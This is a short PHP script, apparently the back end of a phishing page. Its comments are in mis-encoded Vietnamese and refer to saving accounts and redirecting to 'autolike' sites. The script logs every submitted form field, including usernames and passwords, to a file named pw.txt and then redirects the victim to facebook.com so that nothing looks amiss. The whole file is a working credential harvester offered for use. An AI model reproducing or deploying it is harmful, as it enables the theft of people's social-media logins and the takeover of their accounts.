  ?<?php
header("Location: http://facebook.com"); //nh?p link c�c b?n mu?n chuy?n ??n , n�n nh?p link c?a c�c website autolike
$handle = fopen("pw.txt", "a");//n?i l?u t�i kho?n
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>